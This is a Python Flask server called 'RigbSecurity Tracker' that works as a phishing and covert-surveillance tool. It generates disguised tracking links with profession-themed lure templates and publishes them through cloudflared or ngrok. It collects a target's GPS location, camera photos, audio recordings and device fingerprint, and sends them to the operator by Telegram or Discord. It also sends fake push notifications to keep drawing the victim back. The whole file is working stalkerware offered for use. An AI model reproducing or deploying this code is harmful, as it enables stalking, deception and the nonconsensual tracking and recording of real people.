#!/usr/bin/env python3

VERSION = '2.0.0'

R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'
Y = '\033[33m'
M = '\033[35m'
B = '\033[1m'
RST = '\033[0m'

import sys
import os
import json
import time
import uuid
import base64
import signal
import argparse
import threading
import traceback
import subprocess as subp
from datetime import datetime
from pathlib import Path
from csv import writer as csv_writer

try:
    from flask import Flask, request, jsonify, send_from_directory, Response
    from flask_sock import Sock
except ImportError:
    print(f'{Y}[!] Installing dependencies...{W}')
    os.system('pip3 install flask flask-sock pywebpush requests')
    from flask import Flask, request, jsonify, send_from_directory, Response
    from flask_sock import Sock

try:
    from pywebpush import webpush, WebPushException
except ImportError:
    os.system('pip3 install pywebpush')
    from pywebpush import webpush, WebPushException

import utils

# ═══════════════════════════════════════════
# PATHS
# ═══════════════════════════════════════════

SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
DB_DIR = os.path.join(SCRIPT_DIR, 'db')
LOG_DIR = os.path.join(SCRIPT_DIR, 'logs')
CAPTURES_DIR = os.path.join(SCRIPT_DIR, 'captures')
STATIC_DIR = os.path.join(SCRIPT_DIR, 'static')
TEMPLATES_JSON = os.path.join(SCRIPT_DIR, 'template', 'templates.json')
META_FILE = os.path.join(SCRIPT_DIR, 'metadata.json')
DATA_FILE = os.path.join(DB_DIR, 'results.csv')
TARGETS_FILE = os.path.join(DB_DIR, 'targets.json')

for d in [DB_DIR, LOG_DIR, CAPTURES_DIR, STATIC_DIR]:
    os.makedirs(d, exist_ok=True)

# ═══════════════════════════════════════════
# ARGUMENT PARSER
# ═══════════════════════════════════════════

parser = argparse.ArgumentParser(description='RigbSecurity Tracker v' + VERSION)
parser.add_argument('-p', '--port', type=int, default=8080, help='Server port [Default: 8080]')
parser.add_argument('-t', '--tunnel', choices=['cloudflared', 'ngrok', 'manual'], 
                    default='cloudflared', help='Tunnel type [Default: cloudflared]')
parser.add_argument('--no-tunnel', action='store_true', help='No tunnel, manual port forwarding')
parser.add_argument('-tg', '--telegram', help='Telegram bot token:chatId')
parser.add_argument('-wh', '--webhook', help='Discord/Custom webhook URL')
parser.add_argument('-v', '--version', action='store_true', help='Print version')
parser.add_argument('-k', '--kml', help='KML output filename')

args = parser.parse_args()

if args.version:
    print(VERSION)
    sys.exit()

# Telegram config
TELEGRAM = os.getenv('TELEGRAM') or args.telegram
WEBHOOK = os.getenv('WEBHOOK') or args.webhook

# VAPID keys
VAPID_PUBLIC = os.getenv('VAPID_PUBLIC', '')
VAPID_PRIVATE = os.getenv('VAPID_PRIVATE', '')

# ═══════════════════════════════════════════
# DATA STORAGE
# ═══════════════════════════════════════════

targets = {}        # tracking_id -> {meta}
gps_data = {}       # tracking_id -> [locations]
media_log = {}      # tracking_id -> [media entries]
device_info = {}    # tracking_id -> {device data}
push_subs = {}      # tracking_id -> push subscription
ws_targets = {}     # tracking_id -> websocket
ws_dashboards = []  # dashboard websockets

# Load existing targets
def load_targets():
    global targets, gps_data, media_log
    if os.path.exists(TARGETS_FILE):
        try:
            with open(TARGETS_FILE) as f:
                data = json.load(f)
                targets = data.get('targets', {})
                gps_data = data.get('gps_data', {})
                media_log = data.get('media_log', {})
                utils.print(f'{G}[+] {C}Loaded {len(targets)} targets from disk{W}')
        except:
            pass

def save_targets():
    try:
        with open(TARGETS_FILE, 'w') as f:
            json.dump({
                'targets': targets,
                'gps_data': gps_data,
                'media_log': media_log
            }, f, indent=2, default=str)
    except:
        pass

load_targets()

# Auto-save every 60 seconds
def auto_save():
    while True:
        time.sleep(60)
        save_targets()

save_thread = threading.Thread(target=auto_save, daemon=True)
save_thread.start()

# ═══════════════════════════════════════════
# BANNER
# ═══════════════════════════════════════════

def banner():
    art = f"""{G}
 ____  _       _     ____                       _ _         
|  _ \$$_) __ _| |__ / ___|  ___  ___ _   _ _ __(_) |_ _   _ 
| |_) | |/ _` | '_ \\\\___ \\ / _ \\/ __| | | | '__| | __| | | |
|  _ <| | (_| | |_) |___) |  __/ (__| |_| | |  | | |_| |_| |
|_| \\_\\_|\\__, |_.__/|____/ \\___|\\___|\\___|_|  |_|\\__|\\__, |
         |___/            {Y}TRACKER v{VERSION}{G}                 |___/{W}
                                                                    
{G}[>] {C}Created By   : {W}RigbSecurity
{G}[>] {C}Version      : {W}{VERSION}
{G}[>] {C}Mode         : {Y}GPS ONLY — No IP Geolocation{W}
{G}[>] {C}Features     : {W}GPS + Camera + Audio + Persistence
"""
    utils.print(art)

# ═══════════════════════════════════════════
# LOAD TEMPLATES
# ═══════════════════════════════════════════

def load_templates():
    with open(TEMPLATES_JSON) as f:
        return json.load(f)['templates']

# ═══════════════════════════════════════════
# TELEGRAM NOTIFICATIONS
# ═══════════════════════════════════════════

def send_telegram_gps(tid, entry):
    if not TELEGRAM:
        return
    try:
        parts = TELEGRAM.split(':')
        if len(parts) < 3:
            return
        token = f"{parts[0]}:{parts[1]}"
        chat_id = parts[2]
        
        name = targets.get(tid, {}).get('name', tid)
        lat = entry.get('lat', '?')
        lon = entry.get('lon', '?')
        acc = entry.get('acc', '?')
        
        import requests
        url = f"https://api.telegram.org/bot{token}"
        
        # Send location pin
        requests.post(f"{url}/sendLocation", json={
            'chat_id': chat_id,
            'latitude': lat,
            'longitude': lon
        }, timeout=10)
        
        # Send text details
        msg = (
            f"📍 *GPS FIX — [{name}]*\n"
            f"Lat: `{lat}`\n"
            f"Lon: `{lon}`\n"
            f"Accuracy: `{acc}m`\n"
            f"Source: `SATELLITE GPS`\n"
            f"Time: `{datetime.now().strftime('%H:%M:%S')}`\n"
            f"[Google Maps](https://maps.google.com/?q={lat},{lon})"
        )
        requests.post(f"{url}/sendMessage", json={
            'chat_id': chat_id,
            'text': msg,
            'parse_mode': 'Markdown',
            'disable_web_page_preview': True
        }, timeout=10)
        
    except Exception as e:
        utils.print(f'{R}[-] {C}Telegram error: {str(e)}{W}')

def send_telegram_photo(tid, filepath):
    if not TELEGRAM:
        return
    try:
        parts = TELEGRAM.split(':')
        token = f"{parts[0]}:{parts[1]}"
        chat_id = parts[2]
        name = targets.get(tid, {}).get('name', tid)
        
        import requests
        url = f"https://api.telegram.org/bot{token}/sendPhoto"
        
        with open(filepath, 'rb') as photo:
            requests.post(url, data={
                'chat_id': chat_id,
                'caption': f"📸 [{name}] — {datetime.now().strftime('%H:%M:%S')}"
            }, files={'photo': photo}, timeout=30)
    except:
        pass

# ═══════════════════════════════════════════
# DISCORD WEBHOOK
# ═══════════════════════════════════════════

def send_discord(tid, entry, msg_type='gps'):
    if not WEBHOOK:
        return
    try:
        import requests
        name = targets.get(tid, {}).get('name', tid)
        
        if msg_type == 'gps':
            embed = {
                "embeds": [{
                    "title": f"📍 GPS Fix — {name}",
                    "color": 3066993,
                    "fields": [
                        {"name": "Latitude", "value": str(entry.get('lat')), "inline": True},
                        {"name": "Longitude", "value": str(entry.get('lon')), "inline": True},
                        {"name": "Accuracy", "value": f"{entry.get('acc')}m", "inline": True},
                        {"name": "Source", "value": "SATELLITE GPS", "inline": True},
                        {"name": "Maps", "value": f"[Open](https://maps.google.com/?q={entry['lat']},{entry['lon']})"}
                    ],
                    "footer": {"text": f"RigbSecurity Tracker | {datetime.now().strftime('%H:%M:%S')}"}
                }]
            }
        else:
            embed = {
                "embeds": [{
                    "title": f"📱 {msg_type} — {name}",
                    "color": 10181046,
                    "description": json.dumps(entry, indent=2)[:2000],
                    "footer": {"text": "RigbSecurity Tracker"}
                }]
            }
        
        requests.post(WEBHOOK, json=embed, timeout=10)
    except:
        pass

# ═══════════════════════════════════════════
# FLASK APP
# ═══════════════════════════════════════════

app = Flask(__name__, static_folder=STATIC_DIR)
sock = Sock(app)

import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# ─── Serve tracking page ───

@app.route('/<path>/<tid>')
def serve_tracking_page(path, tid):
    # Validate it's a known URL path
    templates = load_templates()
    valid_paths = [t['url_path'] for t in templates]
    
    if path not in valid_paths:
        return "Not found", 404
    if tid not in targets:
        return "Not found", 404
    
    targets[tid]['visits'] = targets[tid].get('visits', 0) + 1
    
    print_visit(tid)
    return send_from_directory(STATIC_DIR, 'tracker.html')

# ─── API: Create tracking link ───

@app.route('/api/create')
def api_create():
    tid = uuid.uuid4().hex[:8]
    template = request.args.get('template', 'generic')
    name = request.args.get('name', '')
    
    targets[tid] = {
        'created': datetime.now().isoformat(),
        'template': template,
        'name': name or tid,
        'visits': 0
    }
    gps_data[tid] = []
    media_log[tid] = []
    
    # Find URL path for template
    templates = load_templates()
    url_path = 'verify'
    for t in templates:
        if t['dir_name'] == template or t['name'].lower() == template.lower():
            url_path = t['url_path']
            break
    
    host = request.host_url.rstrip('/')
    link = f"{host}/{url_path}/{tid}"
    dashboard = f"{host}/dashboard"
    
    save_targets()
    
    return jsonify({
        'trackingId': tid,
        'link': link,
        'dashboard': dashboard
    })

# ─── API: Receive GPS (THE MAIN ONE) ───

@app.route('/api/gps/<tid>', methods=['POST'])
def api_gps(tid):
    if tid not in targets:
        return jsonify({'error': 'invalid'}), 404
    
    data = request.get_json(silent=True) or {}
    
    entry = {
        'lat': data.get('lat'),
        'lon': data.get('lon'),
        'acc': data.get('acc'),
        'alt': data.get('alt'),
        'dir': data.get('dir'),
        'spd': data.get('spd'),
        'source': data.get('source', 'gps'),
        'ts': data.get('ts', datetime.now().isoformat()),
        'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
        'ua': request.headers.get('User-Agent', '')
    }
    
    if tid not in gps_data:
        gps_data[tid] = []
    gps_data[tid].append(entry)
    
    # Print to terminal
    print_gps(tid, entry)
    
    # Save to CSV
    csv_save(tid, entry)
    
    # Broadcast to dashboard
    broadcast_dashboard({'type': 'gps', 'tid': tid, 'entry': entry})
    
    # Telegram + Discord (first fix, then every 10th)
    count = len(gps_data[tid])
    if count == 1 or count % 10 == 0:
        send_telegram_gps(tid, entry)
        send_discord(tid, entry, 'gps')
    
    return jsonify({'status': 'ok'})

# ─── API: Beacon endpoint (for sendBeacon on page close) ───

@app.route('/api/beacon/<tid>', methods=['POST'])
def api_beacon(tid):
    if tid not in targets:
        return '', 204
    
    try:
        raw = request.get_data(as_text=True)
        data = json.loads(raw) if raw else {}
        
        entry = {
            'lat': data.get('lat'),
            'lon': data.get('lon'),
            'acc': data.get('acc'),
            'source': 'gps_beacon',
            'ts': datetime.now().isoformat(),
            'final': data.get('final', False)
        }
        
        if entry['lat'] is not None:
            if tid not in gps_data:
                gps_data[tid] = []
            gps_data[tid].append(entry)
            print_gps(tid, entry)
            broadcast_dashboard({'type': 'gps', 'tid': tid, 'entry': entry})
    except:
        pass
    
    return '', 204

# ─── API: Receive Media (Photos + Audio) ───

@app.route('/api/media/<tid>', methods=['POST'])
def api_media(tid):
    if tid not in targets:
        return jsonify({'error': 'invalid'}), 404
    
    data = request.get_json(silent=True) or {}
    media_type = data.get('type', 'photo')
    media_b64 = data.get('data', '')
    camera = data.get('camera', 'front')
    
    # Save file
    target_dir = os.path.join(CAPTURES_DIR, tid)
    os.makedirs(target_dir, exist_ok=True)
    
    ext = 'jpg' if media_type == 'photo' else 'webm'
    filename = f"{media_type}_{camera}_{int(time.time()*1000)}.{ext}"
    filepath = os.path.join(target_dir, filename)
    
    try:
        b64_clean = media_b64.split(',')[-1] if ',' in media_b64 else media_b64
        with open(filepath, 'wb') as f:
            f.write(base64.b64decode(b64_clean))
    except:
        return jsonify({'error': 'decode failed'}), 400
    
    entry = {
        'type': media_type,
        'camera': camera,
        'filename': filename,
        'ts': data.get('ts', datetime.now().isoformat())
    }
    
    if tid not in media_log:
        media_log[tid] = []
    media_log[tid].append(entry)
    
    print_media(tid, media_type, camera, filename)
    broadcast_dashboard({'type': 'media', 'tid': tid, 'entry': entry})
    
    # Send first 3 photos to Telegram
    photo_count = len([m for m in media_log[tid] if m['type'] == 'photo'])
    if media_type == 'photo' and photo_count <= 3:
        send_telegram_photo(tid, filepath)
    
    return jsonify({'status': 'ok'})

# ─── API: Receive Device Info ───

@app.route('/api/device/<tid>', methods=['POST'])
def api_device(tid):
    if tid not in targets:
        return jsonify({'error': 'invalid'}), 404
    
    data = request.get_json(silent=True) or {}
    device_info[tid] = data
    
    print_device(tid, data)
    broadcast_dashboard({'type': 'device', 'tid': tid, 'data': data})
    send_discord(tid, data, 'Device Info')
    
    return jsonify({'status': 'ok'})

# ─── API: Push Subscription ───

@app.route('/api/subscribe/<tid>', methods=['POST'])
def api_subscribe(tid):
    push_subs[tid] = request.get_json(silent=True)
    utils.print(f'{G}  [+] {C}[{tid}] Push notification subscribed{W}')
    
    # Start push loop
    threading.Thread(target=push_loop, args=(tid,), daemon=True).start()
    
    return jsonify({'status': 'subscribed'})

# ─── API: Send Push ───

@app.route('/api/push/<tid>', methods=['POST'])
def api_push(tid):
    sub = push_subs.get(tid)
    if not sub or not VAPID_PUBLIC or not VAPID_PRIVATE:
        return jsonify({'status': 'no subscription or no VAPID keys'})
    
    template = targets.get(tid, {}).get('template', 'generic')
    msg = get_push_message(template)
    
    try:
        webpush(
            subscription_info=sub,
            data=json.dumps(msg),
            vapid_private_key=VAPID_PRIVATE,
            vapid_claims={"sub": "mailto:admin@rigbsecurity.com"}
        )
        utils.print(f'{Y}  [!] {C}Push sent to [{tid}]: {msg["title"]}{W}')
        return jsonify({'status': 'sent'})
    except WebPushException as e:
        del push_subs[tid]
        return jsonify({'status': 'failed', 'error': str(e)})

# ─── API: VAPID Key ───

@app.route('/api/vapid-key')
def api_vapid():
    return jsonify({'key': VAPID_PUBLIC})

# ─── API: All Targets (Dashboard) ───

@app.route('/api/all-targets')
def api_all_targets():
    result = {}
    for tid in targets:
        result[tid] = {
            'tracking': targets[tid],
            'locations': gps_data.get(tid, []),
            'media': media_log.get(tid, []),
            'device': device_info.get(tid, {})
        }
    return jsonify(result)

# ─── API: Remote Command ───

@app.route('/api/command/<tid>', methods=['POST'])
def api_command(tid):
    # For WebSocket-based remote commands
    # This would send to the target's open page
    data = request.get_json(silent=True) or {}
    broadcast_dashboard({'type': 'command_ack', 'tid': tid, 'command': data.get('command')})
    return jsonify({'status': 'sent' if tid in ws_targets else 'offline'})

# ─── Serve Static Files ───

@app.route('/dashboard')
@app.route('/dashboard.html')
def serve_dashboard():
    return send_from_directory(STATIC_DIR, 'dashboard.html')

@app.route('/sw.js')
def serve_sw():
    response = send_from_directory(STATIC_DIR, 'sw.js')
    response.headers['Service-Worker-Allowed'] = '/'
    response.headers['Content-Type'] = 'application/javascript'
    return response

@app.route('/manifest.json')
def serve_manifest():
    return send_from_directory(STATIC_DIR, 'manifest.json')

@app.route('/js/<path:filename>')
def serve_js(filename):
    return send_from_directory(os.path.join(SCRIPT_DIR, 'js'), filename)

@app.route('/captures/<tid>/<filename>')
def serve_capture(tid, filename):
    return send_from_directory(os.path.join(CAPTURES_DIR, tid), filename)

@app.route('/api/keepalive')
def keepalive():
    return '', 200

# ─── WebSocket: Dashboard ───

@sock.route('/ws/dashboard')
def ws_dashboard(ws):
    ws_dashboards.append(ws)
    utils.print(f'{G}  [+] {C}Dashboard connected ({len(ws_dashboards)} total){W}')
    try:
        while True:
            ws.receive(timeout=60)
    except:
        pass
    finally:
        if ws in ws_dashboards:
            ws_dashboards.remove(ws)

def broadcast_dashboard(data):
    msg = json.dumps(data, default=str)
    dead = []
    for ws in ws_dashboards:
        try:
            ws.send(msg)
        except:
            dead.append(ws)
    for ws in dead:
        if ws in ws_dashboards:
            ws_dashboards.remove(ws)

# ═══════════════════════════════════════════
# PUSH NOTIFICATION MESSAGES (per profession)
# ═══════════════════════════════════════════

def get_push_message(template):
    messages = {
        'contractor':   [{'title':'🏗️ Job Lead Expiring','body':'Kitchen remodel lead expires in 1 hour.'},
                         {'title':'📋 Customer Message','body':'The homeowner sent you a message.'}],
        'carpenter':    [{'title':'🪚 New Estimate Request','body':'Custom furniture — $5K budget.'},
                         {'title':'📸 Client Sent Photos','body':'Project photos received.'}],
        'electrician':  [{'title':'⚡ Emergency Call','body':'Customer without power for 2 hours.'},
                         {'title':'📋 Inspection Report','body':'Report needs your signature.'}],
        'teacher':      [{'title':'🏫 Admin Message','body':'Principal shared an important document.'},
                         {'title':'👨‍👩‍👧 Parent Message','body':'A parent responded to your note.'}],
        'actor':        [{'title':'🎬 Callback!','body':'Director wants to see you again.'},
                         {'title':'📋 Updated Sides','body':'New script pages uploaded.'}],
        'realtor':      [{'title':'🏠 Buyer Update','body':'Buyer increased offer by $15K.'},
                         {'title':'📊 New Comp','body':'Comparable property sold in your area.'}],
        'photographer': [{'title':'📸 Client Message','body':'Wedding client wants to discuss shots.'}],
        'dj':           [{'title':'🎧 Gig Expiring','body':'Saturday gig needs confirmation in 4 hours.'}],
        'delivery':     [{'title':'🚚 Route Changed','body':'2 new priority stops added.'}],
        'nurse':        [{'title':'🏥 Bonus Increased','body':'Tonight shift bonus bumped to $750.'}],
        'mechanic':     [{'title':'🔧 Repair Approved','body':'Customer approved $2,800 repair.'}],
        'lawyer':       [{'title':'⚖️ Documents Uploaded','body':'Client uploaded medical records.'}],
        'fitness':      [{'title':'💪 Client Progress','body':'Your client logged a personal record!'}],
        'chef':         [{'title':'👨‍🍳 Menu Approved','body':'Saturday dinner client approved menu.'}],
        'barber':       [{'title':'💈 VIP Update','body':'VIP client moved to 3PM.'}],
        'musician':     [{'title':'🎵 Session Change','body':'Studio session moved to 2PM.'}],
        'cleaner':      [{'title':'🧹 Premium Job','body':'Deep clean — $400 payout.'}],
        'trucker':      [{'title':'🚛 Rate Increased','body':'Load bumped to $5.00/mile.'}],
        'influencer':   [{'title':'📱 Brand Approved','body':'Nike approved your concept.'}],
        'pastor':       [{'title':'⛪ Member Hospitalized','body':'Family requesting a visit.'}],
    }
    
    import random
    msgs = messages.get(template, [{'title':'🔔 Action Required','body':'You have a pending item.'}])
    return random.choice(msgs)

def push_loop(tid):
    """Send push notifications periodically to bring target back"""
    time.sleep(2 * 60 * 60)  # First push after 2 hours
    
    while tid in push_subs:
        sub = push_subs.get(tid)
        if not sub or not VAPID_PUBLIC:
            break
        
        template = targets.get(tid, {}).get('template', 'generic')
        msg = get_push_message(template)
        
        try:
            webpush(
                subscription_info=sub,
                data=json.dumps(msg),
                vapid_private_key=VAPID_PRIVATE,
                vapid_claims={"sub": "mailto:admin@rigbsecurity.com"}
            )
            utils.print(f'{Y}  [!] {C}Auto-push [{tid}]: {msg["title"]}{W}')
        except:
            del push_subs[tid]
            break
        
        import random
        time.sleep((3 + random.random() * 3) * 3600)  # 3-6 hours

# ═══════════════════════════════════════════
# PRETTY PRINTING — Terminal Output
# ═══════════════════════════════════════════

def print_visit(tid):
    t = targets[tid]
    utils.print(f'\n{Y}  [!] {C}Target visited page{W}')
    utils.print(f'{G}  [+] {C}ID       : {W}{tid}')
    utils.print(f'{G}  [+] {C}Name     : {W}{t.get("name", tid)}')
    utils.print(f'{G}  [+] {C}Template : {W}{t.get("template")}')
    utils.print(f'{G}  [+] {C}Visit #  : {W}{t.get("visits", 1)}')

def print_gps(tid, entry):
    name = targets.get(tid, {}).get('name', tid)
    lat = entry.get('lat', '?')
    lon = entry.get('lon', '?')
    acc = entry.get('acc', '?')
    spd = entry.get('spd')
    src = entry.get('source', 'gps')
    
    speed_str = f"{float(spd)*2.237:.1f} mph" if spd else "Stationary"
    acc_str = f"{float(acc):.1f}" if acc else "?"
    final = " [FINAL]" if entry.get('final') else ""
    
    utils.print(f"""
{G}  ╔══════════════════════════════════════════════╗
  ║  📍 GPS SATELLITE FIX{final:<24} ║
  ╠══════════════════════════════════════════════╣
  ║  Target    : {name:<33}║
  ║  Latitude  : {str(lat):<33}║
  ║  Longitude : {str(lon):<33}║
  ║  Accuracy  : {acc_str + 'm':<33}║
  ║  Speed     : {speed_str:<33}║
  ║  Source    : {src:<33}║
  ║  Time      : {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<33}║
  ╠══════════════════════════════════════════════╣
  ║  🗺️  https://maps.google.com/?q={lat},{lon}
  ╚══════════════════════════════════════════════╝{W}""")

def print_media(tid, media_type, camera, filename):
    name = targets.get(tid, {}).get('name', tid)
    if media_type == 'photo':
        utils.print(f'{M}  📸 [{name}] Photo captured ({camera} camera): {filename}{W}')
    else:
        utils.print(f'{C}  🎙️ [{name}] Audio recorded: {filename}{W}')

def print_device(tid, data):
    name = targets.get(tid, {}).get('name', tid)
    batt = data.get('battery', {})
    net = data.get('network', {})
    scr = data.get('screen', {})
    gpu = data.get('gpu', {})
    
    utils.print(f"""
{M}  ╔══════════════════════════════════════════════╗
  ║  📱 DEVICE FINGERPRINT                        ║
  ╠══════════════════════════════════════════════╣
  ║  Target   : {name:<34}║
  ║  Platform : {str(data.get('platform','?')):<34}║
  ║  Cores    : {str(data.get('cores','?')):<34}║
  ║  Memory   : {str(data.get('memory','?')) + ' GB':<34}║
  ║  Battery  : {str(batt.get('level','?')) + '%':<34}║
  ║  Charging : {str(batt.get('charging','?')):<34}║
  ║  Network  : {str(net.get('effectiveType','?')) + ' / ' + str(net.get('type','?')):<34}║
  ║  Screen   : {str(scr.get('w','?')) + 'x' + str(scr.get('h','?')):<34}║
  ║  GPU      : {str(gpu.get('renderer','?'))[:34]:<34}║
  ║  Timezone : {str(data.get('timezone','?')):<34}║
  ║  Language : {str(data.get('language','?')):<34}║
  ║  Cameras  : {str(data.get('cameras','?')):<34}║
  ╚══════════════════════════════════════════════╝{W}""")

def csv_save(tid, entry):
    try:
        with open(DATA_FILE, 'a', newline='') as f:
            w = csv_writer(f)
            w.writerow([
                tid,
                targets.get(tid, {}).get('name', tid),
                entry.get('lat'),
                entry.get('lon'),
                entry.get('acc'),
                entry.get('alt'),
                entry.get('spd'),
                entry.get('source'),
                datetime.now().isoformat()
            ])
    except:
        pass

# ═══════════════════════════════════════════
# KML OUTPUT
# ═══════════════════════════════════════════

def generate_kml(tid, filename):
    locs = gps_data.get(tid, [])
    if not locs:
        return
    
    kml = '<?xml version="1.0" encoding="UTF-8"?>\n'
    kml += '<kml xmlns="http://www.opengis.net/kml/2.2">\n<Document>\n'
    kml += f'  <name>RigbSecurity Tracker — {tid}</name>\n'
    
    for loc in locs:
        kml += f'''  <Placemark>
    <name>{loc.get("ts", "")}</name>
    <Point>
      <coordinates>{loc.get("lon")},{loc.get("lat")},0</coordinates>
    </Point>
  </Placemark>\n'''
    
    kml += '</Document>\n</kml>'
    
    with open(f'{filename}.kml', 'w') as f:
        f.write(kml)
    
    utils.print(f'{G}  [+] {C}KML saved: {filename}.kml{W}')

# ═══════════════════════════════════════════
# TUNNELING
# ═══════════════════════════════════════════

def start_cloudflared(port):
    utils.print(f'{G}  [+] {C}Starting Cloudflare tunnel...{W}')
    
    try:
        proc = subp.Popen(
            ['cloudflared', 'tunnel', '--url', f'http://localhost:{port}'],
            stdout=subp.PIPE, stderr=subp.PIPE
        )
        
        time.sleep(4)
        
        # Read URL from stderr
        import select
        for _ in range(30):
            if select.select([proc.stderr], [], [], 1)[0]:
                line = proc.stderr.readline().decode()
                if 'trycloudflare.com' in line:
                    # Extract URL
                    for word in line.split():
                        if 'trycloudflare.com' in word:
                            url = word.strip()
                            if not url.startswith('http'):
                                url = 'https://' + url
                            return url.rstrip('/'), proc
            time.sleep(0.5)
        
        utils.print(f'{R}  [-] {C}Could not get tunnel URL{W}')
        return None, proc
        
    except FileNotFoundError:
        utils.print(f'{R}  [-] {C}cloudflared not found. Install it or use --no-tunnel{W}')
        return None, None

def start_ngrok(port):
    utils.print(f'{G}  [+] {C}Starting ngrok tunnel...{W}')
    try:
        subp.Popen(['ngrok', 'http', str(port)], stdout=subp.DEVNULL, stderr=subp.DEVNULL)
        time.sleep(3)
        import requests as req
        resp = req.get('http://127.0.0.1:4040/api/tunnels', timeout=5)
        data = resp.json()
        url = data['tunnels'][0]['public_url']
        if 'https' not in url:
            url = url.replace('http', 'https')
        return url, None
    except Exception as e:
        utils.print(f'{R}  [-] {C}ngrok failed: {str(e)}{W}')
        return None, None

# ═══════════════════════════════════════════
# TEMPLATE SELECTOR
# ═══════════════════════════════════════════

def select_template():
    templates = load_templates()
    
    utils.print(f'\n{C}  ┌──────────────────────────────────────────────────────┐')
    utils.print(f'  │             SELECT TEMPLATE                           │')
    utils.print(f'  └──────────────────────────────────────────────────────┘{W}\n')
    
    # Group by category
    categories = {}
    for t in templates:
        cat = t.get('category', 'other')
        if cat not in categories:
            categories[cat] = []
        categories[cat].append(t)
    
    cat_labels = {
        'profession': f'{Y}── PROFESSION TEMPLATES ──{W}',
        'social': f'{Y}── SOCIAL MEDIA TEMPLATES ──{W}',
        'tech': f'{Y}── TECH TEMPLATES ──{W}',
        'generic': f'{Y}── GENERIC ──{W}'
    }
    
    for cat in ['profession', 'social', 'tech', 'generic']:
        if cat in categories:
            utils.print(f'  {cat_labels.get(cat, cat)}')
            for t in categories[cat]:
                idx = str(t['id']).rjust(2)
                utils.print(f"  {G}[{idx}]{W} {t['icon']}  {t['desc']}")
            utils.print('')
    
    try:
        choice = input(f'{G}  [?] {C}Select template > {W}').strip()
        choice = int(choice)
        
        for t in templates:
            if t['id'] == choice:
                return t
        
        utils.print(f'{R}  [-] Invalid choice, using Generic{W}')
        return templates[-1]
        
    except (ValueError, KeyboardInterrupt):
        utils.print(f'{R}  [-] Invalid input, using Generic{W}')
        return templates[-1]

# ═══════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════

def main():
    banner()
    
    # Select template
    template = select_template()
    
    # Target name
    target_name = input(f'{G}  [?] {C}Target name (optional) > {W}').strip()
    
    # Create tracking ID
    tid = uuid.uuid4().hex[:8]
    targets[tid] = {
        'created': datetime.now().isoformat(),
        'template': template['dir_name'],
        'name': target_name or tid,
        'visits': 0
    }
    gps_data[tid] = []
    media_log[tid] = []
    save_targets()
    
    port = args.port
    
    # Start tunnel
    tunnel_url = None
    tunnel_proc = None
    
    if not args.no_tunnel:
        if args.tunnel == 'cloudflared':
            tunnel_url, tunnel_proc = start_cloudflared(port)
        elif args.tunnel == 'ngrok':
            tunnel_url, tunnel_proc = start_ngrok(port)
    
    if tunnel_url:
        link = f"{tunnel_url}/{template['url_path']}/{tid}"
        dashboard = f"{tunnel_url}/dashboard"
    else:
        link = f"http://localhost:{port}/{template['url_path']}/{tid}"
        dashboard = f"http://localhost:{port}/dashboard"
    
    utils.print(f"""
{G}  ╔══════════════════════════════════════════════════════╗
  ║         🎯 TRACKING LINK READY                       ║
  ╠══════════════════════════════════════════════════════╣
  ║                                                      ║
  ║  Template  :  {template['icon']} {template['name']:<38}║
  ║  Target    :  {(target_name or tid):<38}║
  ║  ID        :  {tid:<38}║
  ║  Mode      :  {Y}GPS SATELLITE ONLY{G:<38}║
  ║                                                      ║
  ╠══════════════════════════════════════════════════════╣{W}
{Y}  📎 SEND THIS LINK:{W}
  {link}

{Y}  📊 YOUR DASHBOARD:{W}
  {dashboard}
{G}  ╚══════════════════════════════════════════════════════╝{W}

{Y}  [*] Waiting for target to click link...{W}
{Y}  [*] Press Ctrl+C to stop{W}
{Y}  [*] Data saves to: {SCRIPT_DIR}/db/{W}
{Y}  [*] Photos/Audio save to: {SCRIPT_DIR}/captures/{tid}/{W}
""")
    
    # Handle shutdown
    def shutdown(sig, frame):
        utils.print(f'\n{R}  [-] Shutting down...{W}')
        save_targets()
        if args.kml and gps_data.get(tid):
            generate_kml(tid, args.kml)
        if tunnel_proc:
            tunnel_proc.terminate()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, shutdown)
    signal.signal(signal.SIGTERM, shutdown)
    
    # Run Flask
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)


if __name__ == '__main__':
    main()